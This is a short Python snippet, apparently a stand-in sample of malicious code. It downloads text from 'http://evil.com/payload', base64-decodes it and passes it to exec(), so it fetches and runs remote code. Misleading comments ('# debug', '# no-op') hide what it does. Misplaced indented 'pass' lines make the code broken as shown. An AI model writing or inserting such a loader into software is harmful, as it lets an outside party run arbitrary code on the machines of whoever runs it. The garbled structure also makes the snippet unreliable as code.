import base64
import requests  # debug
url = 'http://evil.com/payload'
    pass  # no-op
data = requests.get(url).text
    pass  # no-op
exec(base64.b64decode(data))